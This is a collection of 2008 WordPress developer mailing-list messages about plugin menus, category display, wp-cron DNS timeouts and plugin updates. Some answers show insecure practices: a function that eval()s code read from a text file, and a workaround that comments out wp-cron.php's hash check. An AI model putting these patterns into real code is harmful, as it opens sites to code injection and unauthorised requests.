I know.  That's what I meant by the "if".  My live host server does  
use localhost, and it works on my local machine too, so I'm good. :)   
Sorry I wasn't more clear.

As of WP 2.6, the wp-config.php file can be one directory up from the  
WordPress files.  No need to change anything - it works  
automatically.  If WP doesn't find a wp-config.php file, it looks one  
directory up.
* WordPress is at example.com/wp/
* wp-config.php is at example.com/

For moving wp-content, I set the WP_CONTENT_DIR and WP_CONTENT_URL  
constants.

ALSO:  I did not notice in your instructions -- you also need to add  
the .loc (or in my case, .local) domain to your "hosts" file.   
(Obviously you've done this, but I didn't see it in your directions.)

What you do is very similar to what I do.  I modify the Apache config  
to add the different domains, I also add those domains to my hosts  
file.  Then I can go to example.com for the live site or example.local  
for the local test site.  I run Apache via MAMP on my Mac laptop.

The wp-config.php files are basically identical, except that the local  
one defines WP_SITEURL and WP_HOME.  That way when I import the data  
from my live site to the local site, it works with the local copy  
despite the .com being set in the database.  The CONSTANT overwrites  
that setting from the DB.

This is true and I misread the error message. I did not see "hoverIntent" on
the end of it, so I thought "$" was the undefined function.

Message-ID: <db047a770812010553y3442edc7p381d355d06878573@mail.gmail.com>

Hello,

how it is possible to use two or more different pages in the
admin-area with one plugin.
when i set a options and statistic page via hook to the admin, all
functions are in one php-file, the is the hover-effekt in the new menu
of 2.7 on the two different points.

add_submenu_page( 'index.php', __('Test', 'test'), $menutitle .
$menutitle_count, get_option('level'), __FILE__, 'display_stats' );
add_options_page( __('Settings Test', 'test'), $menutitle, 9,
__FILE__, 'admin_option_page' );

Thanks for your help!

The parameter that you use __FILE__  in doesn't have to actually be a  
filename, only a unique value. You can base it on a filename if you  
want, but any unique opaque string is fine.

Subject: [wp-hackers] Top level current page navigation
Message-ID: <6AABC1F2-8EDB-4186-BBAC-1B3B0E45C673@gmail.com>

RIght now I am running a convoluted method of determining current page  
navigation for a client's blog that has thousands of posts and  
hundreds of pages:

EXAMPLE NAVIGATION TAB

<li><a href="<?php echo get_category_link(511);?>"<?php if (! 
is_front_page() && in_category('511') && !is_page('1705')) {echo  
'id="current" ';} ?>>News</a></li>


The standard solution is to have is_category, but that only works on  
the category page itself, not any children of that category. The  
in_category solution was supposed to fix that if they add the top  
level parent category to every post. The !is_page('1705') refers to an  
archive page that lists all posts, so I wanted it excluded, as well as  
the home page, both of which would be highlighted as well since they  
contain posts in the other navigation categories.

But now the writers and content managers insist on _not_ tagging posts  
with the parent category, which breaks my navigation again.

What I need is to have the top level navigation be highlighted as  
current for a specific category and any/all of its children.

Why are you not using wp_list_categories() to produce the list? It
adds current-cat and current-cat-parent to categories, for the
is_category cats, and supports a current_category input parameter for
your own use if you want individual posts to trigger the current-cat
class as well.

There's a function in wp-includes/category.php called
    cat_is_ancestor_of()
that might help you, if I've understood correctly what you're trying 
to do.

I started with wp_list_categories() with exlusions, but it soon became  
unwieldy.

Because there are hundreds of categories, and about 10 top level  
categories that I don't want in the navigation. Custom coding any  
exclusions from wp_list_categories() every time they change things  
without my notice isn't a fun option. It's complicated :(

I'll investigate the current-cat-parent stuff further though. Perhaps  
I missed something.

As a point of advice on top of everything else, you should try to get
the actual category ID out of your template code. I find that to be
one of the most annoying parts of this kind of control. If you set up
a global variable in your code to hole categories that you want to
give special properties then reference that variable in the functions
it make the whole thing a lot easier to manage. It also makes it
really easy to iterate through all the categories when you're doing
checks, making all your actual code much leaner. When the relevant
categories change you only need to edit one place instead of going
through all your template files looking for mentions of it. By the
same token you should create wrapper functions for this kind of stuff,
which give you more freedom to do complex checking without completely
wrecking the look/formatting of either your template files or your PHP
code.

Subject: [wp-hackers] Using eval within Wordpress for a function mixed with
	html
Message-ID: <49345DFB.50200@ntlworld.com>

Hi
I want to evaluate the string below within myfunc() and return a result 
ready to drop into my home page (echo $s;)

For reasons I won't bore you with I want to store this fragment in a 
text file.
Have bashed my head with all sorts of variants, but cannot get eval() to 
work!

The bit that works directly in a page is this:
'<a rel="external nofollow" 
href="'.get_bloginfo('wpurl').'/juniors/mirror"><img 
src="/oldsite/images/junior/.thumbs/.mirror.jpg" alt="mirror.jpg" 
title="mirror.jpg" width="95%" /></a> <hr />';

How to use eval() to get the proper result from this type of thing:
Assuming I read the above fragment from a text file into variable $s

function myfunc($s)
eval('\$theresult= \$s;')
return $s;

So any help would be MUCH appreciated!

Best regards from the UK!
Chris

I've never tried this myself, but what's jumping out at me is that
you're not using <?php .... ?> in that text...

Shouldn't you be returning $theresult?

We have a custom XML feed coming off of our blog that feeds into  
Google News, and the method used to select the items to send in the  
feed is by category, "Google News Feed" .

How can we hide the fact that our posts are in that category, without  
messing up the regular functionality of the post?

Dan,

I wrote a little plugin to exclude categories from standard WP  
functions like is_feed, is_front, is_search, etc.
http://wordpress.org/extend/plugins/simply-exclude/

If you don't want to use the plugin you can setup a simple function in  
your theme's functions.php file

// Used to limit the categories displayed in the Feed.
function myHomePostsFilter($query)
{
	if ($query->is_feed)
	$query->set('cat','-1'); // where -1 is the cat ID you want to  
exclude. Also you can put multiple IDs in this second parameter. You  
must include the '-' to negate the cat ID.
	
	return $query;
}
add_filter('pre_get_posts','myHomePostsFilter');

Actually, that is the method that we use to exclude other categories  
from the blog because we use it as a CMS for a more extensive site. It  
excludes categories great, content and all.

However, we don't want to exclude the post itself from anything. We  
just don't want it to show on the site pages that it belongs to a  
certain category.

Love that plugin, by the way. Wish it would have greater functionality  
for excluding pages, but ah well.

Thanks,
Dan

True - I just quoted what I want as a final evaluated result. eval 
assumes the string is php code, and html can be added by dropping out of 
php , like $s= 'echo "hello";?> html here '; eval($s)
but it doesn't like function bloginfo('wpurl') and doesnt like angle 
brackets in the html much either.

Yes, quite right Otto,
I simplified it for the post and inadvertantly altered it in theprocess 
- I am indeed returning $theresult in the actual code I am trying out.

The key thing is how to eval() a mixture of php and html to get same 
result as if it was put straight into a php page.
I saw on php lots of discussion of eval(), and different ideas, but also 
comments that none of them worked properly, so thought would ask on the 
hackers list.

just to re-iterate: this following type of code works straight in a page,
<a rel="external nofollow" 
href="'.get_bloginfo('wpurl').'/juniors/mirror"><img 
src="/oldsite/images/junior/.thumbs/.mirror.jpg" alt="mirror.jpg" 
title="mirror.jpg" width="95%" /></a> <hr />

so what should it be so that I can pull it in from a text file, or a 
database,  and then eval() it will give same result?
Thanks
Chris

Thanks. Yeah. Would like to improve the plugin to handle pages better.  
Maybe one day soon the power that be will enhance the page hooks to be  
similar to the category and tag hook in wpdb so that one doesn't have  
to resort to parsing the join and where parts of the query.

Why don't you just use sprintf?

$string = '<a rel="external nofollow" href="%s/juniors/mirror"><img 
src="/oldsite/images/junior/.thumbs/.mirror.jpg" alt="mirror.jpg" 
title="mirror.jpg" width="95%" /></a> <hr />';

$string = sprintf($string, get_bloginfo('wpurl'));

Done!

good point on sprintf() - but assumes that I know the link will always 
have the bloginfo() as the variable.
 I was trying to generalise it so that, for several records in a text 
file, it would do the whole thing!
Thanks for suggestion
Does anyone know hwo to combine php functions and html using eval?? I 
would still like to know.
Chris

Hi andre,
yes, that's the way I was thinking too!
But don't think that will substitute a php function such as 
bloginfo('wpurl') will it?

Not having tested it, But going off what you originally posted:

function getStringFromFile($file) {
     $s = file_get_contents($file);
     eval('return ' . $s);
}
You need to combine the strings, not to insert one string inside the other  
i believe.

oops, Heres a tested version:

function getStringFromFile($file) {
     $s = file_get_contents($file);
     eval('$return = ' . $s . ';');
     return $return;
}

Subject: [wp-hackers] Slow loading WordPress
Message-ID: <20081201214815.7fb183e6@montecarlo.grandprix.int>

I have friend who has a site that is extremely slow in loading, we
tried WordPress 2.3.x 2.5.1, 2.6.5. The original site ran 2.3.1 when it
became slow. The site ran fine for 3 weeks and became slow after writing
a post, nothing out of the ordinary, same ole article as any other.
Deleting the post didn't help. The site had about 60 posts.

What is slow, you ask, how about 20 secs to load index.php according to
Firebug, no plugins, default theme. Here's the weird thing, the plugin
wp-spamfree loads a file called wpsf-js.php. This file also takes 20
secs to loads.

On the site is also phpBB installed and there are no speed problems
with it, neither with a php file that was uploaded to show the
phpinfo().

Does anybody have any clue what to look for?

Things we have done so far but didn't help
1. Optimized tables.
2. Dropped all tables and imported them again.
3. Upgraded to 2.6.5

If you're just going to echo the result in the template, why not just  
include() the text file?

I guess you are joking, but I will bite. I will say you make the 
wpsf-js.php be cached and check to see if you can compress the JS file 
or pack it. Send word to the plugin author about the speed decrease or 
just deactivate the plugin.

You're problem appears to be that you are programming when you should be 
developing. Take for example your situation. You want a complex solution 
to a simple problem. If you were a developer, you would use the simple 
solution for the simple problem. The simple solution would be one that 
does not involve eval(). I think that if you gave us more code, we'd be 
able to get to the root of your problem and fix the cause instead of 
implementing something to cover it up.

FWIW, yslow is telling me 3.717 seconds for your page load.

And it felt zippy.

Yes. The HTML content, JS, and images probably does take a while to load.

What you are comparing are apples to oranges, which doesn't work well. 
Well, that isn't to say that what you've done already won't hurt. It may 
help PHP that powers WordPress to move faster and any bottleneck, like 
file storage and database access will help. It isn't the cause of your 
slow down.

YSlow doesn't measure server performance, only HTTP and browser 
rendering performance. Firebug likewise. So to clarify, your issue takes 
place on the client side and you tried to find a solution in the wrong 
location. I apologize if I offend you, but I just figured that common 
sense would dictate the solution more clearly than I could have expressed.

So yeah, if you want to speed up the client side performance, you can do 
a number of things, a few you can do on the server side (but not in 
WordPress, unless you want to do the compression in WordPress, but I've 
found that the Apache Deflate module works better). There have been push 
in the past for WordPress to generate a single CSS and JavaScript file 
from the ones that are enqueued and then pack them. However, if you set 
the expires header for the JavaScript and CSS files to a day or a week 
in the future, then it won't really matter since after the first 
download, they won't have to redownload it again.

If you have too many plugins with too many scripts or stylesheets then 
naturally it is going to slow the site down. If you have scripts in the 
page, then that will slow the page down also.

There are a number of solutions, but it isn't WordPress. Well, for the 
most part WordPress won't hold your hand during the process. If you want 
to optimize your theme and site, then it is up to you. There are also a 
number of resources that you can find online which give cookbook type 
examples for most of the points scored in YSlow. Good luck.

I wasn't joking and I found a work around just before Jerry went to
check.

The server has a problem doing a DNS lookup of itself. This causes a
problem for wp-cron execution. When a page loads WordPress tries to
call wp-cron.php, it uses fsockopen and tries to resolve the servers
address. After a 20 sec timeout it fails and continues with the page
building.

The work around:
In wp-cron.php comment out:
if ( $_GET['check'] != wp_hash('187425') )
	exit;

Manually call wp-cron.php : http://example.com/wp-cron.php
Sometimes you have to do it twice, I don't know why.

The real solution is to contact the provider and have them setup a DNS
where the server can resolve itself.

Ah, that is a slightly different than what you described. Yes, the HTTP 
API does have a little issue where fsockopen will ignore the timeout in 
some environments (I think Windows). Also, quite a few people had issues 
with localhost or whatever. If fsockopen fails to conform to the 
timeout, then it will disable the fsockopen transport for 12 hours. 
Should just completely disable it, but it might just be a temporary issue.

Message-ID: <c6c45a350812020306h1163b087oa2523b6bc2af998d@mail.gmail.com>

Currently I use the following, which seems to work well, to add a top
level menu item:

add_menu_page(__('eShop','eshop'), __('eShop','eshop'), $eshoplevel,
__FILE__, 'eshop_admin_orders_stats',WP_PLUGIN_URL.'/eshop/eshop.png');

However the link produced is like this:
admin.php?page=eshop/eshop.php

Which works with no problem but this then invalidates the html:
<li class="wp-has-submenu wp-has-current-submenu wp-menu-open menu-top
toplevel_page_eshop/eshop menu-top-first menu-top-last"
id="toplevel_page_eshop/eshop"><img class="wp-menu-image"
src="http://quirm.net/subeshop/wp-content/plugins/eshop/eshop.png"
alt="" /><div class="wp-menu-toggle"><br /></div><a
href='admin.php?page=eshop/eshop.php' class="wp-has-submenu
wp-has-current-submenu wp-menu-open menu-top toplevel_page_eshop/eshop
menu-top-first menu-top-last" tabindex="1">eShop</a>

the offending part being:
toplevel_page_eshop/eshop

the slash shouldn't be there.

So either I'm doing something wrong, or the slash should be removed
automagically.

Additionally I notice there is no highlighting of links when tabbing
through the page.

I am away from pc today but will try this as soon as I can, sounds like it might work
Otherwise, as you suggest, I wil have to split up the strings to treat them separately, and then better to add a new table than use a text file.
Thanks

Hi Jacob,
hmmm, yes, you're right, tho I hate to admit it!
The overview is that I run a club website, and they are keen to offer adverts to selected people who also advertise in the club handbook - so these would be sold directly, and it's nothing to do with adsense et al.

So, I have a wordpress-based website, the home page has a left hand sidebar, and I want to display a single column of logos (jpg/gifs, each one will have alt/title text promoting it, and clicking the small logo (approx 100px x 140px) will link to the advetisers website.

In addition, the club want the ads to show in a pseudo random order, so that they can offer them all at same price (rather than "nearer the top costs more" etc).
So i was planning to use same concept as the ad-rotator plugin, storing the info for each "advert" in a text file.
At this stage I was then going to hand-craft the details in the text file for any adverts that are sold, rather than write an admin interface - I don't know how sucessful the club will be in this yet, so may be too much work to write a full friendly interface.
The images would be stored on my wordpress site, and to keep it flexible I do not want to hardcode the image locations, but make it relative to bloginfo("wpurl"), in case the adverts are successfull and/or my site location moves. Also eases testing on my locahost and website.

So that is the overview, I would welcome your thoughts
Thanks
Chris

Yeah, I gotta agree with Alan on this one. If you're reading a text
file and then eval()ing it, then that's basically the same as an
include.

Now, on the other hand, if you're eval()ing because you want the
output back as a string, then the short answer is that you can't do
that. eval() executes the code, and if that code makes output, then it
makes the output. The returned result of the eval() call will be
whatever that code in the string does as it's "return" statement.
Output != returned data.

You'd have to use an output buffer to grab the output from the eval().
ob_start() and such.

Couldn't you just use get_bloginfo(), which returns the result, instead of
echoing it?

Here's an example of what I am talking about:

	The post headline
	The the post text
	The the post author
	The the post date
	The post's categories: News, Featured News, Google News <<<--- Need  
to hide just this
	END LOOP

I need to hide the Google News category from the display on the blog,  
without compromising the rest of the post. Thanks for everyone's  
patience :)

Message-ID: <7DFA1757-F8CD-433A-87D6-890D1D1EFDF9@me.com>

over the last week, i've had two blogs go down with a corrupt wp- 
options. i am not sure if the cause was part of a 2.7 beta bug or not  
but i think it is a possible security risk.

since wordpress could could not get any info out of the options  
table,  it assumed it was a new installation and allowed  for someone  
to enter a blog name and create an admin account. once i fixed the wp- 
options table went into admin and deleted that account but i was just  
lucky i noticed this right away.

the question is:
is it possible to add some sort database table health check before  
assuming it is a new installation of wordpress?

Instead of __FILE__, you can use any arbitrary string.  Try this:

add_menu_page(__('eShop','eshop'), __('eShop','eshop'), $eshoplevel,  
'eshop', 'eshop_admin_orders_stats',WP_PLUGIN_URL.'/eshop/eshop.png');

Subject: [wp-hackers] Lock posts and multiple logins
Message-ID: <4935F94C.9000103@duechiacchiere.it>

Hello everybody,

for a website I'm working on, I decided to use Wordpress as the main 
CMS. There are several people contributing to it, so I'd like to know if 
you plan to add the following features to Wordpress in the near future. 
I've tried to find a plugin that does what I need, but I had no luck 
till now.

1) Lock posts that are being edited: I know you can password protect a 
post you are working on, to avoid other people to edit the same content 
at the same time, but I am looking for something more "transparent" to 
the content editor, that automatically does some sort of check-in/check-out
2) Avoid multiple logins for the same user (from different computers, or 
just different browsers). I know I can use the function 
is_user_logged_in() and write my own plugin, along with something like 
update_option( 'user_last_seen', time() ), but maybe there something 
already made for this issue :)

Thank you for your help,
camu

I believe WordPress allready warns that another user is allready editing  
the post, The revision functionality will allow you to see what other  
authors have modified.
I'm not 100% sure if it locks the user out from modifying, or simply  
warns, or allows you to bypass..

Wow that was a quick reply! Thanks dd32 :) Actually, there is a warning, 
but only if two different users try to edit the same post. This does not 
apply if the same user is connected from two different places. I know, 
this looks weird, but since we have several users, I was thinking about 
creating three or four different users with different roles, and then 
share them among the editors :-)

Oh, nevermind.  I was thinking this was for submenus.  My bad. :\

Any chance of an official interface for plugin authors to add icons  
for submenu pages?

Another point that is not documented

instead of

WP_PLUGIN_URL.'/eshop/eshop.png'

you can have the value

'div'

to be able to manage the menu icon with css ..

aha! I used eshop.php to be consistent with my submenu.

Of course you have to change the first parameter of the add submenu
page to match.

This also helped me understand this:
[quote from codex]
In situations where a plugin is creating it's own top-level menu, the
first submenu will normally have the same link title as the top-level
menu and hence the link will be duplicated. The duplicate link title
can be avoided by calling the add_submenu_page function with the
parent and file parameters being given the same value.
[/quote]
and I was able to sort that out as well!

Many thanks!

I've played around with this and decided not to use it - at least not
at the moment. It seems to be ok with what I have, at least for now.
But thanks for the tip.

This should work (not tested):


Instead of <?php the_category ?>

put

<?php
ob_start();
the_category();
$categories = ob_get_clean();
str_replace('GoogleNews', '' , $categories);
echo $categories;
?>

IMO: Dont use output buffers, Create a new function in your themes  
function.php and use that instead, Here's one i use:

I have a category 'prefixes' under which i have a myriad of other  
categories (I use them to prefix the title of the post with a category:  
The red part of each title: http://dd32.id.au/blog/), I didnt want those  
categories showing up in the category listing.

You could probably also hook on something like get_terms and use a few  
conditionals (!is_admin() && $taxonomy == 'category') and filter out at  
that stage if you wanted to completely get rid of them.


function theme_the_category($before = '', $sep = '', $after = '') {
	global $wp_rewrite;
	$cats = get_the_category();

	if ( $prefix = theme_get_category_by_slug('prefixes') ) {
		foreach ( $cats as $key => $cat )
			if ( $cat->parent == $prefix->term_id )
				unset($cats[ $key ]);
	}

	$rel = ( is_object($wp_rewrite) && $wp_rewrite->using_permalinks() ) ?  
'rel="category tag"' : 'rel="category"';
	$display_cats = array();
	foreach ( (array) $cats as $cat )
		$display_cats[] = '<a href="' . get_category_link($cat->term_id) . '"  
title="' .
							sprintf(__('View all posts in %s'), $cat->name) . '" ' . $rel . '>'  
. $cat->name . '</a>';

	if ( ! empty($display_cats) )
		echo $before . implode($sep, $display_cats) .  $after;
}

//Cached wrapper around get_category_by_slug()
function theme_get_category_by_slug($slug) {
	if ( ! $category = wp_cache_get($slug, 'category') ) {
		$category = get_category_by_slug($slug);
		wp_cache_set($slug, $category, 'category');
	}
	return $category;
}

Dino, that sounds like a really bad idea. Have you looked into the
Role Manager plugin (
http://www.im-web-gefunden.de/wordpress-plugins/role-manager/ )? It
gives you fine tuned access to the full WP capabilities system (the
default roles are just one example of the system). It allows you to
create new roles with custom capabilities and it even lets you define
the exact capabilities of specific users on their user page.

If you can set up your site to use capabilities (might involve some
compromises with your existing idea but really, it would probably be
okay) then you will simplify a lot of things for yourself. Managing
multiple accounts is also a pain in the ass for users, and you'll end
up with unexpected results when they accidentally use the wrong
accounts. If you're using anything other than the 1 login per user
paradigm Wordpress will always treat you wrong because it treats one
user as one person.

Message-ID: <ab03dc280812031649ib5448d6t1db5e832c5eeeb55@mail.gmail.com>

Hi,

I have added some data fields in a custom section on post edit screen and I
want to save them in a separate table when I click the Save-button.
I have added the 'save_post' action so I expected to get a call to my
save_post function every time the Save-button is clicked but It does not
work as expected.
When I write a new post and enter some data in my fields and click Save my
data fields are not posted to the Save-function (but the Save-function is
called).
If I enter the data into my fields again and click the Save-button the
Save-function is called with my data fields posted correctly.
Does anybody know why this happens and how to correct it?

Thanks!

Subject: [wp-hackers] Odd behaviour when using classes and the
	register_activation_hook() function
Message-ID: <1fa535a70812031825u6ddf6e8cu4a71d1f0a09e8d02@mail.gmail.com>

I've come across this odd issue and I'm not sure if I'm doing
something wrong, so would appreciate any pointers.

I am writing a plugin which uses register_activation_hook() to call a
function when the plugin is activated. From within the function that
gets called, another function is called which is a member function of
a class defined in the plugin.

I've cut the plugin down to the very minimum needed to demonsrate the
code. See: http://johnblackbourn.com/temp/helloworld.phps .

The problem I am seeing is that when the plugin is activated, this
calling of the class member function is causing a fatal error.

"Fatal error: Cannot redeclare activatehelloworld() (previously
declared in [snip] )"

Now, if we remove the line $helloworld->hello(); then all is fine and
the plugin can be activated with no errors. If we instead call another
function here that is not a class member function, all is fine. It
appears that the act of calling a class member function at this point
is doing something strange, or more likely, is acting in a manner that
I don't understand.

It might also be worth mentioning that, oddly enough, the plugin is
actually activated despite this error being shown. This may be related
or it may be a red herring.

I'm stumped. I cannot see any reason why calling a class member
function at this point would produce this error. Anyone?

John.

Scrap that, this is a variable scope issue.

Any global variables that you want to reference inside the function
that is called by register_activation_hook() must be explicitly
declared as global inside the main body of the plugin (ie. _outside_
of this function). The plugin file is include()-ed inside another
function at the point where it is activated unlike at others times
when the plugin file is simply include()-ed. Phew. Bit of an odd one
to get your head around but there we go.

Yeah, this is a common mistake. A lot of people assume that the plugin
main body is globally scoped when that's not *always* the case.

You can't make any assumptions about the scope of the plugin, so if
you need to use a global, always declare it.

I have not experienced any issues with plugin upgrades.  Perhaps you
could tell us what plugin it is that you are using and one of us could
test that plugin.

Have 2.7-RC1-10041 installed.
1.  Did Plugins-Add New, used Author 'scribu' search and saw six plugins. 
Installed 'Deviant Thumbs 1.7.4 and activated it.
2.  Did Plugins-Installed and deactived Deviant Thumbs, then did Edit on 
that Plugin, and changed version to 1.7.2.
3.  Visited Plugins-Installed and it showed message, "There is a new version 
of Deviant Thumbs available. View version 1.7.4".  Did the 'upgrade 
automatically' thing and it executed the upgrade successfully.

>> Also, the search by name in the Plugin Installer is useless.

A Plugin search on the term 'deviant' returned three plugins, including 
Deviant Thumbs.  But, I don't have a search by name--just term, author, and 
tag.

I've noticed that on some areas of the dashboard, the dates shown are 
formatted according to the translation file (<locale>.mo, if it exists). 
This is true (at least) on the Pages' and Posts' lists.

My question is if it wouldn't make more sense to read the format from 
Settings > General > Date Format since right now it can get a bit 
confusing for a user having defined a format of, say "Y-m-d" but seing a 
format of "Y\d\m" because the .mo says so. This is particularly 
pertinent to MU where different users can choose different date and time 
formats,  but  applies to wp.org, mu.org and wp.com.

As the provider couldn't solve the issue (Uuuh, yeah, sure, whatever) I
came up with a hack. Unfortunately it's a core hack, which I
don't like but my friend is OK with it, as long as it made his site
response normally again. I edited the wp-includes/cron.php to use an IP
instead of site url.

	previous and next comment links in Wordpress 2.7
Message-ID: <ee3949160812050855p6e79a192o98de9463625cfcd6@mail.gmail.com>

Am I right in saying that paginate_comments_links,
previous_comments_link and next_comments_link cannot be used before
wp_list_comments, they must only be used after?

It's been driving me bonkers because I wanted to put page links at the
top of the comments (mirroring the setup I had with the paged-comments
plugin). But when I dig into the code I see that
"$wp_query->max_num_comment_pages", which is used by
paginate_comments_links, previous_comments_link and next_comments_link
to calculate the max number of comment pages, is only set *after* the
walker has been executed in wp_list_comments. Before that, it seems to
be set to 0.

Which means you can only have page, prev and next links after the
comments, which seems a bit limited. Should this be a bug?

Speaking of which, though, an actual 'search by name' feature sure would 
be handy. For example, and quite ironically, searching for the 'Simple 
Tagging' plugin, you have to go to like the 3rd or 4th page of results 
before you actually find the plugin. Ironic, because that could be fixed 
if the plugin had better tags on Extend :)

from menu-header.php:
if ( 'div' === $item[6] )
   $img = '<div class="wp-menu-image"><br /></div>';
else
   $img = '<img class="wp-menu-image" src="' . $item[6] . '" alt="" />';

So, either you're passing a full img src and it outputs a regular
<img>, or you're passing 'div' and it outputs the <div> shown on line
2 of the snippet.

Example:
add_menu_page('page_title', 'menu_title', 'manage_options', 'blah',
'some_function', 'div');

This will add:
<li id="toplevel_page_blah" class="[various classes...]">
<div class="wp-menu-image"><br/></div>
[the link and stuff to the page...]
</li>

So you can style with something like:
#toplevel_page_blah div.wp-menu-image {
  background:transparent url(full url to icon);
}

In other words: mostly complicated compared to the regular & simple:
add_menu_page('page_title', 'menu_title', 'manage_options', 'blah',
'some_function', [full url to icon]);

Would be even better if WP just stuck on the same core code itself, and 
didn't overload itself with so much extra stuff. The old XXXKB download 
was awesome... now it's what, XXMB ? And it's only gotten more slow in 
general for load times. >__< Can't win for losing I guess..

Partially wrong.
That could be fixed if the search function was trivially enhanced. It
has been said many times before: it sucks to a point it's pathetic and
simply useless.

Yeah, thats the plugin I was talking about. Also manually modified the
version from 1.7.3 to 1.7.2 etc. and nothing happened.

The Nofollow Free plugin has also been upgraded recently and still no update
notice.

The update notices were working fine on the same host with WP 2.6.

Message-ID: <af352e280812051139n4ec83466o489803e1898ecebd@mail.gmail.com>

The current table design wordpress uses for links/bookmarks limits the
length of the description to 255 characters.  The field type used is
varchar(255).  This can be very restrictive and in our case we really need
more space available for that field.  I propose changing the field type to
varchar(0) or some other type that will allow much longer descriptions.

We could just modify the code or our database for ourselves, but this could
cause problems if try to restore a backup on a new unmodified installation.
Also, I don't think space limitations these days really require us to limit
descriptions to only 255 characters.  Storage is cheap right?

I have no problem submitting a ticket and patch but I'd like to know what
other people think and what field type would be recommended.

Thanks,
Jared

No Malaiac, this works for all.
The only change I made is calling the server by IP instead of name.
After opening the connection to the server data is send by this line:
fputs( $argyle,
	  "GET {$parts['path']}?check=" . wp_hash('187425') . " HTTP/1.0\r\n"
	. "Host: {$_SERVER['HTTP_HOST']}\r\n\r\n"
);

The line with Host tells the receiving webserver which website the
data is for. The webserver will do the rest.

For example my site has IP address: 74.50.21.205
If you do reverse lookup it will respond with direa.lunarpages.com but
if do a telnet over HTTP:

$ telnet 74.50.21.205 80

Just to add about ozh

add_menu_page('toto', __('Mails','MailPress'), 'MailPress_edit_mails',
MailPress_page_mails,'', 'div');

in your css add

#adminmenu #toplevel_page_mailpress_mails div.wp-menu-image {
    background:transparent url(../images/menu.png) no-repeat scroll -1px
-33px;
}
#adminmenu #toplevel_page_mailpress_mails:hover div.wp-menu-image,
#adminmenu #toplevel_page_mailpress_mails.wp-has-current-submenu
div.wp-menu-image,
#adminmenu #toplevel_page_mailpress_mails.current div.wp-menu-image {
    background:transparent url(../images/menu.png) no-repeat scroll -1px
-1px;
}

would continue DD32's work.

Here is the current version - http://gist.github.com/32236/

Attached is the current diff.

At this point it looks like the items are loaded in the correct order,  
but now work needs to be done to the javascript itself to make sure  
that it loads after the document has completed rendering.

There is something to be said about using crontab or server cron instead 
of wp-cron itself.

As for the IP solution. It was already tried, but it broke too many 
wp-crons on other servers. The decision was made that those who require 
IP are just SOL. There was going to be a filter or something, but no 
matter. Your code also doesn't use the HTTP API.

Nice solution for a good problem... WordPress is not slow by
itself.... It is your mysql server which might be slow if at all your
WP site is slow, Watch out for some memory hogging plugins... Check
performance by desabling plugins one by one and in combination.. You
may find it working.

There's some fundamental problems with using a real cron job:
1. Noobs often don't know how to set them up.
2. How often do you want to run this job? Because that's the only
interval upon which things will happen. Running it once a minute seems
rather wasteful.
3. Some hosts just don't have any way to do it at all. Not every host
uses cpanel.

WP-Cron is a decent solution, works for most people, and runs sorta in
the background, kinda. If PHP had a better way to spawn child
processes/threads, it wouldn't be needed, but it doesn't, and so there
you go.

I did some debugging with wp_update_plugins() and I found out that it exits
at this point:

    if( 200 != $raw_response['response']['code'] ) {
        return false;
    }

That's because in $raw_response I have

[response] => Array
        (
            [code] => id
            [message] => #175
        )

What is message #175 and why does code contain the string 'id', instead of
200?

Jacob,

Do you know what the problem was on other servers that an IP
address couldn't be used?

What should I have used to get the IP address of the server if it's not
by $_SERVER['SERVER_ADDR'] or are you referring to the fact I forgot
quotes in my original posting?

I was referring to development that went into WordPress 2.7. There was a 
report that the wp-cron wasn't working and the fix was to use IP, 
therefore I created a patch that used IP, however more reports came in 
that doing so broke other servers that were using IP. Some servers have 
firewall rules which prevent IP from being used for security purposes 
and the problem, I think, is that one IP can serve multiple domains and 
if you use the IP, then the server has no idea which domain (even if you 
add the host HTTP header).

With the HTTP API in WordPress 2.7, the part where you specify where you 
connect and then send the relevant information such as host header and 
domain was lost. It might work well with fsockopen(), but it won't work 
with the HTTP extension, or cURL and you can have no idea which one will 
be used. Care was taken to ensure that each so called, "transport" was 
developed so that they performed the same. fsockopen is used last. You 
can create the Wp_HTTP_Fsockopen object separately and use it or any one 
of the classes. The request method in the Wp_Http class does create the 
proper environment for the classes. Although the classes themselves will 
also sort of help you out if you use them individually.

Not sure about the missing quotes, I didn't even notice it.

Hmm, that is interesting. Need to fix that. Whatever transport you are 
using is messed at that point. Some PHP HTTP extensions don't exactly 
work the same way, therefore one of them probably is returning a string 
instead of the correct integer (The Response header is not returned, so 
the code can't be extracted). from it).

What revision of WordPress 2.7 are you using. What transport are you 
using? ( I believe Ryan has a patch which will allow you find out).

If you make a ticket with the full details, I'm sure it will be fixed as 
soon as possible. Will need additional information.

On shared-hosting servers, the web server uses the domain name that is
called in order to decide which "home" directory to use.  Otherwise, since
the ip address is the same, how to tell 1632.org from ericflint.net?    The
IP solution simply -does not work- on shared hosting servers.

Well, I don't know all that "Geek Talk" stuff or whatever, all I know, 
is, I don't have any plugins at all. It's just a plain default 2.7 
installation and logging into the back-end, or loading certain areas of 
the back-end it's slow (sometimes). Not always, just sometimes. Sooo, my 
guess is, it's probably the host (server). However, I having a 2.6.5 
test blog (no plugins there either), it loads nicely. The loading / 
logging into both was done around the same time frame as well.

It can tell the difference the same way it normally does for an HTTP 
connection by the host header otherwise shared hosting simply would not 
work.

I think the real problem that can come from trying to use an IP Address 
is when a shared server has multiple IP Addresses for different users.

In this scenario if you use the wrong IP address then the web server on 
the end of the connection won't have a matching host.

The other problems that have come up are servers which are configured to 
not allow to connect back to themselves.

In this case my home page, - I want to have part of the page changing,

I don't want the whole page (with all the menus,sidebar,posts) etc to

There doesn't seem to be too much info in the codex on this, can someone

I just linked to this from a couple of pages in the Codex --
    http://codex.wordpress.org/Plugin_Resources
    http://codex.wordpress.org/AJAX_in_Plugins

The latter article does discuss how to do AJAX in a plugin, though 
it's using SACK rather than JQuery. The concepts are the same (and I 
think/hope they're explained OK on that page), but if someone wants to 
rewrite the examples to use JQuery instead of SACK, that might be a 
good idea. On the other hand, there are now 4 links to JQuery/AJAX 
external refs on that page, so maybe that is good enough.

Subject: [wp-hackers] Update without upgrading database?
Message-ID: <9431DAF0-3C90-490A-829C-B9125309EB89@striderweb.com>

Hi all --

So, if I update WordPress manually, the database doesn't actually get  
updated until the first time I go into the admin section.

What would happen if I didn't go into admin right away?  If I upgraded  
the WP files, but didn't go into admin for a week, would that cause  
big problems, or is the system able to cope with the "old" database  
until the update script is run?

Thanks,
Stephen

Thanks to both Jennifer and Tom, that gives me a start.
Are either of the libraries normally loaded by Wordpress? (assuming 
standard themes)
Thanks again

In all the time I've used WordPress, I've only had one instance where 
the blog stopped working until I upgraded the database. I'll say, that 
if you upgrade WordPress, the first thing you should do is revisit the 
